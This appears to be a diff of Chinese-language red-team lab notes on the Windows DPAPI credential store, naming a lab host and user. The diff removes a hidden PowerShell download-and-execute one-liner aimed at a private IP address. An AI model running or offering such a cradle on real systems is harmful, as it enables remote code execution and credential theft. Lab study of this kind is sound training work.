@@ -1,7 +1,5 @@
 Data Protection API (DPAPI)是windows里的一个组件，专门用于存储RDP或者第三方软件如谷歌chrome里的数据
 
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
-
 
 在wkstn-1上操作,以bfarmer的身份操作。这个实验如果以ntlmb身份操作不能复现
 
